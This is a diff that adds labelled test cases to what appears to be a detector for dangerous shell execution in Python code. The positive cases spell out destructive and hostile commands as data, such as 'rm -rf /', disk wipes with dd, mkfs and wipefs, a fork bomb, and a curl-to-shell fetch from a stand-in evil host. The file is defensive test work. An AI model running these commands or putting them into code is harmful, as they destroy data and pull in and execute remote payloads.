@@ -1208,6 +1208,48 @@ PY_RECURSIVE_DELETE_CASES = [
     ("pathlib.Path('/tmp').unlink()", "python", "py-recursive-delete", 0),
 ]
 
+PY_SHELL_EXEC_CASES = [
+    # === True Positives ===
+    ('os.system("rm -rf /")', "python", "py-shell-exec", 1),
+    ('os.popen("rm -rf /var/data")', "python", "py-shell-exec", 1),
+    ('os.system("mkfs.ext4 /dev/sda1")', "python", "py-shell-exec", 1),
+    ('os.system("dd if=/dev/zero of=/dev/sda bs=1M")', "python", "py-shell-exec", 1),
+    (
+        'os.system("curl -fsSL http://evil.example/x.sh | sh")',
+        "python",
+        "py-shell-exec",
+        1,
+    ),
+    ('os.system("shred -u /etc/passwd")', "python", "py-shell-exec", 1),
+    ('subprocess.run(["rm", "-rf", "/"], check=False)', "python", "py-shell-exec", 1),
+    ('subprocess.call("wipefs -a /dev/sda", shell=True)', "python", "py-shell-exec", 1),
+    ('subprocess.check_output("shutdown -h now", shell=True)', "python", "py-shell-exec", 1),
+    ('subprocess.Popen(":(){ :|:& };:", shell=True)', "python", "py-shell-exec", 1),
+    # The call and its payload may be split over several lines.
+    (
+        """subprocess.run(
+    ['rm', '--recursive', '/opt'],
+    check=True,
+)""",
+        "python",
+        "py-shell-exec",
+        1,
+    ),
+    # === True Negatives ===
+    ('os.system("echo hello")', "python", "py-shell-exec", 0),
+    ('os.system("ls -la /tmp")', "python", "py-shell-exec", 0),
+    ('subprocess.run(["git", "status"], check=True)', "python", "py-shell-exec", 0),
+    ('subprocess.Popen(["/bin/bash"])', "python", "py-shell-exec", 0),
+    ('subprocess.run(["rm", "cache.txt"], check=True)', "python", "py-shell-exec", 0),
+    ("os.remove('/tmp/report.txt')", "python", "py-shell-exec", 0),
+    (
+        'subprocess.check_output(["curl", "https://example.com"], check=False)',
+        "python",
+        "py-shell-exec",
+        0,
+    ),
+]
+
 PY_SENSITIVE_FILE_ACCESS_CASES = [
     # === TP: open() + sensitive path ===
     ("open('/etc/shadow', 'r')", "python", "py-sensitive-file-access", 1),
